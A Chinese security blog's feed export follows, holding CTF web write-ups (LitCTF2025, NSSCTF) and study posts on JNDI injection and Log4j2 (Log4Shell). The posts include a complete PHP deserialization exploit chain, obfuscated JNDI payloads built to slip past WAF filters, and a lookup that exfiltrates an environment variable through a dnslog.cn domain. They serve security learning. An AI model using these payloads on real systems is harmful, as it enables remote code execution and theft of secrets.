<h5 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIclient</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">        <span class="type">IremoteObject</span> <span class="variable">lookup</span> <span class="operator">=</span> (IremoteObject) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/RO&quot;</span>);  </span><br><span class="line"><span class="comment">//        System.out.println(lookup.sayHello(&quot;Li&quot;));  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/50c249a4/20260114162243959.png" alt="image.png"></p>
<h5 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h5><p><img src="/posts/50c249a4/20260114163146064.png" alt="image.png"><br>从getObjectInstance开始入手<br><img src="/posts/50c249a4/20260114163308922.png" alt="image.png"><br>接着到getObjectFactoryFromReference<br><img src="/posts/50c249a4/20260114163508486.png" alt="image.png"><br>这里加载beanfactory类，然后强转为ObjectFactory，根据这一点，我们使用的本地类是要满足实现ObjectFactory接口的。<br>最后调回到第二个getObjectInstance<br><img src="/posts/50c249a4/20260114164000003.png" alt="image.png"><br><img src="/posts/50c249a4/20260114164020099.png" alt="image.png"><br>这里判断是否为ResourceRef类的实例<br>然后在经过一系列操作之后（这里不细看了），会调用到这里<br><img src="/posts/50c249a4/20260114164726665.png" alt="image.png"><br>会利用反射执行ELProccessor的eval方法，这里的值为<br><img src="/posts/50c249a4/20260114164951631.png" alt="image.png"><br>从而执行恶意命令</p>
<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>jndi差不多就结束了，高版本的绕过还有很多，后面在补充吧。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#0x04-%E5%B0%8F%E7%BB%93">Java反序列化之JNDI学习 | Drunkbaby’s Blog</a><br><a href="https://www.bilibili.com/video/BV1ct4y1h79t?t=1110.0">https://www.bilibili.com/video/BV1ct4y1h79t?t=1110.0</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>JNDI注入</category>
      </categories>
  </entry>
  <entry>
    <title>Litctf2025</title>
    <url>/posts/46c3f967/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="nest-js"><a href="#nest-js" class="headerlink" title="nest_js"></a>nest_js</h2><p><img src="/posts/46c3f967/1748352218799-ba3d0ae7-0d40-4b17-8e77-eb66f491b430.png" alt="img"></p>
<p>弱密码，爆破得到用户名和密码为，admin，password</p>
<h2 id="星愿信箱"><a href="#星愿信箱" class="headerlink" title="星愿信箱"></a>星愿信箱</h2><p><img src="/posts/46c3f967/1748352423685-8cc91369-0544-494f-abda-2ace5aae05b7.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤了&#123;&#123;&#125;&#125;双写的大括号，利用&#123;%%&#125;绕过，cat /flag利用 nl /f* 进行绕过</span><br></pre></td></tr></table></figure>



<h2 id="ez-file"><a href="#ez-file" class="headerlink" title="ez_file"></a>ez_file</h2><p><img src="/posts/46c3f967/1748352942000-a25182aa-944a-4c08-88b1-de96c8366e5c.png" alt="img"></p>
<p>这边有一个重定向，可以进去看一下</p>
<p><img src="/posts/46c3f967/1748353353565-5eb9e523-f2fb-430e-bccc-5564044ae764.png" alt="img"></p>
<p>这边又一个文件包含，可以上传jpg，进行文件包含。</p>
<p><img src="/posts/46c3f967/1748354269566-936399cc-f5b6-4baa-a8f1-16c69cd382b4.png" alt="img"></p>
<p>传马</p>
<p><img src="/posts/46c3f967/1748354305346-b671d746-d8cf-439c-9e67-e160f98261df.png" alt="img"></p>
<p>得到flag</p>
<h2 id="多重宇宙日记"><a href="#多重宇宙日记" class="headerlink" title="多重宇宙日记"></a>多重宇宙日记</h2><p>知识点：</p>
<p>本题考的是原型链污染，在js语言中每个对象都有__proto__属性，指向了构造函数的原型对象，当我们可以对键名进行控制并且字符串可以被解析成对象或方法时就可以进行原型链污染（按我理解后端代码应该还得有递归）。我是这样理解的，_proto__属性通过递归修改掉object.prototype，从而将整个原型链进行污染</p>
<p><img src="/posts/46c3f967/1748429853627-0e983755-2df3-482b-b046-4cfceed339d2.png" alt="img"></p>
<p>就这样</p>
<h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p><img src="/posts/46c3f967/1748430668409-0a0ebfac-b307-4cf3-bdb9-f34ee735c5ed.png" alt="img"></p>
<p>扫一下目录</p>
<p><img src="/posts/46c3f967/1748431541605-62b52ff1-9216-4cd4-b3cf-84de96964adf.png" alt="img"></p>
<p>这边有一个api.js</p>
<p><img src="/posts/46c3f967/1748431579717-8c105893-eea6-45bc-859e-7cf23c2baf07.png" alt="img"></p>
<p><img src="/posts/46c3f967/1748431629911-529725d7-1ada-4de7-b045-d5829f9f91fa.png" alt="img"></p>
<p>文件读取</p>
<p>然后你会发先flag不在根目录，而且有waf</p>
<p><img src="/posts/46c3f967/1748431868609-98176365-e9d0-4017-ba5e-90c5003c87f0.png" alt="img"></p>
<p>最后读取&#x2F;api&#x2F;sys&#x2F;urlcode.php，发现这个文件，访问</p>
<p><img src="/posts/46c3f967/1748431909375-d31116fc-da2e-4f89-9bdf-7f712421bee5.png" alt="img"></p>
<p>得到flag</p>
<h2 id="君の名は"><a href="#君の名は" class="headerlink" title="君の名は"></a>君の名は</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/readflag`);&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$magic</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;musubi = <span class="variable">$data</span>[<span class="string">&#x27;musubi&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;magic = <span class="variable">$data</span>[<span class="string">&#x27;magic&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;musubi)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        (<span class="keyword">new</span> <span class="variable">$args</span>[<span class="number">0</span>](<span class="variable">$args</span>[<span class="number">1</span>]))-&gt;&#123;<span class="variable language_">$this</span>-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$thread</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;memory.<span class="variable language_">$this</span>-&gt;thread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$kuchikamizake</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;soul)-&gt;<span class="title function_ invoke__">flag</span>(<span class="variable">$this</span>-&gt;kuchikamizake,<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;call error!no flag!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Litctf2025</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Litctf2025&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$Litctf2025</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$Litctf2025</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>“&#x2F;^[Oa]:[\d]+&#x2F;i”绕过这个可以使用php的原生类，可以看一下<a href="https://www.cnblogs.com/Rxuxin/articles/18898161">https://www.cnblogs.com/Rxuxin/articles/18898161</a></p>
<p>思路</p>
<p>首先反序列化 ArrayObject，触发 Taki 的 <code>__unserialize</code>，尝试调用 <code>musubi</code>（Mitsuha 对象）</p>
<p>Mitsuha 对象被当作函数调用，触发 <code>__invoke</code>。<code>__invoke</code> 返回 <code>memory . thread</code>，其中 memory 是 KatawareDoki 对象。将 KatawareDoki 转为字符串触发 <code>__toString</code>。<code>__toString</code> 调用 <code>soul-&gt;flag(kuchikamizake, name)</code></p>
<ul>
<li>这里 <code>soul</code> 是另一个 Taki 对象</li>
<li>调用不存在的 <code>flag</code> 方法触发 <code>__call</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__call` 执行 `(new $args[0]($args[1]))-&gt;&#123;$this-&gt;magic&#125;()</span><br></pre></td></tr></table></figure>

<ul>
<li><code>$args[0]</code> 是 “ReflectionFunction”（反射类）</li>
<li><code>$args[1]</code> 是 “\000lambda_1”（匿名函数名）（后面的序号会随着访问次数的增加而增加，所以交的时候最好重开环境）</li>
<li><code>$this-&gt;magic</code> 是 “invoke”</li>
</ul>
<p>构造new ReflectionFunction(\000lambda_1) -&gt; invoke 从而执行匿名函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$magic</span> = <span class="string">&quot;invoke&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$thread</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kuchikamizake</span> = <span class="string">&quot;ReflectionFunction&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;\000lambda_1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Taki</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Mitsuha</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">KatawareDoki</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> -&gt; musubi = <span class="variable">$b</span>;  <span class="comment">//调用Mitsuha</span></span><br><span class="line"><span class="variable">$b</span> -&gt; thread = <span class="variable">$c</span>;   <span class="comment">//调用KatawareDoki</span></span><br><span class="line"><span class="variable">$c</span> -&gt; soul = <span class="variable">$a</span>;   <span class="comment">//调用Taki</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">array</span>(<span class="string">&quot;PusTR&quot;</span>=&gt;<span class="variable">$a</span>);<span class="comment">//创建了一个数组 $d，其中键为 &quot;PusTR&quot;，值为 $a 对象</span></span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$d</span>);  <span class="comment">//用这个数组创建了一个 ArrayObject 实例 $e ，O转化为C</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/46c3f967/1748489710364-6722ea73-57ec-49a7-b667-743b51a48588.png" alt="img"></p>
<p>刷新了一次，我就加到2了，可以进行爆破，同时要注意一点，原生类改为C的时候要注意php版本哈。</p>
]]></content>
      <categories>
        <category>复现</category>
      </categories>
  </entry>
  <entry>
    <title>Log4j2</title>
    <url>/posts/6cdb73/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前几天做了一个log4j2的题目，但是还没有系统的学一下（关于开发，漏洞的原理，一些绕过方法等）。</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong>Log4j2</strong> 是 Apache Log4j 的升级版本，相较于 Log4j 1.x 和 Logback，提供了显著的性能提升和功能改进。它被广泛认为是目前最优秀的 Java 日志框架之一，常与 <strong>SLF4J</strong> 门面结合使用以实现高效日志记录。</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>这里要先准备一个log4j2的环境</p>
<ul>
<li>jdk8u65</li>
<li>log4j2 2.14.1</li>
<li>cc 3.2.1<br>首先是依赖包<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
关于log4j2的实现，我们选择使用xml来实现<br>这是一个很简单的实现方法<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span>        <span class="comment">&lt;!-- 控制台输出 --&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span>    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span>        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span>    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
然后写个小demo，看一下输出<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.function.LongFunction;  </span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;  </span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4j2test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);  </span><br><span class="line">       logger.info(<span class="string">&quot;Hello World&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/posts/6cdb73/20260204182257116.png" alt="image.png"><br>这样其实就准备的差不多了</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>影响版本：2.x &lt;&#x3D; log4j &lt;&#x3D; 2.15.0-rc1<br>既然是一个日志框架，每当有人登录的时候会把信息输出出来就像<br><img src="/posts/6cdb73/20260204182746271.png" alt="image.png"><br>那么如果使用${java:os}会发生什么呢？<br><img src="/posts/6cdb73/20260204182837057.png" alt="image.png"><br>这里我们会看到，显示了一些操作系统的信息，其实是这里会对lookup进行调用，最主要的是这里用的lookup还是jndi的lookup，所以就会造成jndi的注入。<br>我们先起一个rmi的服务测试一下<br>还是之前写的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIserver</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;  </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"><span class="comment">//        initialContext.rebind(&quot;rmi://localhost:1099/remoteobject&quot;, new remoteObject());  </span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);  </span><br><span class="line"><span class="comment">//        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);  </span></span><br><span class="line"><span class="comment">//        resourceRef.add(new StringRefAddr(&quot;forceString&quot;,&quot;x=eval&quot;));  </span></span><br><span class="line"><span class="comment">//        resourceRef.add(new StringRefAddr(&quot;x&quot;,&quot;Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;));  </span></span><br><span class="line">  </span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/RO&quot;</span>, reference);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里运行之后是可以执行恶意类的<br><img src="/posts/6cdb73/20260204190020334.png" alt="image.png"><br><img src="https://lxu2n.oss-cn-shanghai.aliyuncs.com/imgs/20260204190020334.png" alt="image.png"></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/posts/6cdb73/20260204192445129.png" alt="image.png"><br>对于调试看Drunkbaby师傅的博客是从这里开始调试的，当然我是一步步调到这里的，前面的就不写了，师傅们也可以直接从这里打断点开始，前面的不重要，从这里进入format方法。<br><img src="/posts/6cdb73/20260204192748530.png" alt="image.png"><br>然后反复测了一会，发现不同的i会进入不同的fomat方法（当然有的可能是一样的方法，没细看），这里当i为8的时候进入到了一个特殊的format方法当中。<br><img src="/posts/6cdb73/20260204193705698.png" alt="image.png"></p>
<p><img src="/posts/6cdb73/20260204193901800.png" alt="image.png"><br>在这里会判断是否是log4j2的lookups功能，这里是为true的，所以我们继续向下，会识别出${}的里的内容并使用StrSubstitutor进行替换，这让跟进replace看一下<br><img src="/posts/6cdb73/20260204194843834.png" alt="image.png"><br>继续跟进substitute<br><img src="/posts/6cdb73/20260204195218996.png" alt="image.png"><br>这里会提取出${}的内容，return出来之后到这里<br><img src="/posts/6cdb73/20260204200228998.png" alt="image.png"><br>然后继续向下执行一直到resolveVariable<br><img src="/posts/6cdb73/20260204200931868.png" alt="image.png"><br>这里的varname就是rmi:&#x2F;&#x2F;localhost:1099&#x2F;RO<br><img src="/posts/6cdb73/20260204201136487.png" alt="image.png"><br>到这里我们就能看到对lookup的调用了。<br>在一直向里跟一下就可以看到原生的jndi的调用了。<br><img src="/posts/6cdb73/20260204201455187.png" alt="image.png"></p>
<h1 id="针对waf的绕过方法"><a href="#针对waf的绕过方法" class="headerlink" title="针对waf的绕过方法"></a>针对waf的绕过方法</h1><p>waf主要是对jndi等关键词的禁用，这里有几种佬整理的绕过方法：</p>
<ol>
<li><p>利用分割符和多个${}绕过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logg.info(<span class="string">&quot;$&#123;$&#123;::-J&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过lower和upper绕过<br><img src="/posts/6cdb73/20260204202505516.png" alt="image.png"><br>这个能利用的原因是就是这里，不仅支持jndi，也支持upper和lower<br>所以可以写成这样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logg.info(<span class="string">&quot;$&#123;$&#123;lower:J&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;&quot;</span>);</span><br><span class="line">logg.info(<span class="string">&quot;$&#123;$&#123;upper:j&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;&quot;</span>);</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>其实也可以编码绕过例如Unicode和16进制，就比如今天刚做的一个题ez_gadget</p>
</li>
<li><p>总结payload<br>原始：<code>&quot;$&#123;jndi:ldap://127.0.0.1:1234/ExportObject&#125;&quot;;</code><br>变化：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;a:-j&#125;ndi:ldap:<span class="comment">//127.0.0.1:1234/ExportObject&#125;;</span></span><br><span class="line">  </span><br><span class="line">$&#123;$&#123;a:-j&#125;n$&#123;::-d&#125;i:ldap:<span class="comment">//127.0.0.1:1234/ExportObject&#125;&quot;;</span></span><br><span class="line">  </span><br><span class="line">$&#123;$&#123;lower:jn&#125;di:ldap:<span class="comment">//127.0.0.1:1234/ExportObject&#125;&quot;;</span></span><br><span class="line">  </span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;di:ldap:<span class="comment">//127.0.0.1:1234/ExportObject&#125;&quot;;</span></span><br><span class="line">  </span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;$&#123;::-di&#125;:ldap:<span class="comment">//127.0.0.1:1234/ExportObject&#125;&quot;;</span></span><br></pre></td></tr></table></figure></li>
<li><p>小技巧<br>可以通过sys和env协议，读取一些敏感信息（配合dns），例如<br><code>$&#123;jndi:ldap://$&#123;env:LOGNAME&#125;.uaoeck.dnslog.cn&#125;</code><br>利用dns带外回显。<br>整体就是这些</p>
</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/#Log4j2-%E5%A4%8D%E7%8E%B0">Log4j2复现 | Drunkbaby’s Blog</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Log4j2</category>
      </categories>
  </entry>
  <entry>
    <title>NSSCTF秋季新生赛</title>
    <url>/posts/b5e7950d/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="SIGN-IN"><a href="#SIGN-IN" class="headerlink" title="SIGN IN!"></a>SIGN IN!</h2><p><img src="/posts/b5e7950d/1762077936860-30947fef-279b-456b-a92f-5157acea47d7-1762930764949-34.png" alt="img"></p>
<p>考了三个请求头</p>
<p><img src="/posts/b5e7950d/1762078156867-09a60b16-8e52-4651-b579-bbe839a69b9f-1762930823154-38.webp" alt="image.png"></p>
<h2 id="ezez-include"><a href="#ezez-include" class="headerlink" title="ezez_include"></a>ezez_include</h2><p><img src="/posts/b5e7950d/1762078967532-f240356c-fc8a-4178-976c-9d163fe0e2f2.png" alt="img"></p>
<p>有文件上传的地方，也有文件包含的点，那就是上传一个代码的图片，包含一下就行</p>
<p><img src="/posts/b5e7950d/1762079176481-9ad6f22f-bd2e-4e7c-8c33-a8c8b4ac6aff.png" alt="img"></p>
<p><img src="/posts/b5e7950d/1762079378388-0b37bdf5-6779-4ff6-a9d5-f8bb3f5f943d-1762930850457-43.png" alt="img"></p>
<h2 id="isAdmin"><a href="#isAdmin" class="headerlink" title="isAdmin"></a>isAdmin</h2><p><img src="/posts/b5e7950d/1762079907329-1c300153-c55f-4974-9d20-d9e44a243443.png" alt="img"></p>
<p>伪造即可</p>
